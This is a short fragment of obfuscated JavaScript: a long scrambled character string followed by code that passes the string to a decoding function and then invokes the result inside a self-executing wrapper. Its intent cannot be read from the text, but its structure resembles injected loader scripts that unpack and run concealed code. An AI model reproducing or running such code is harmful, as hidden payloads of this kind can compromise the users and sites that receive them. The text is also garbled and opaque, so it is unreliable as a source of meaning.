t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
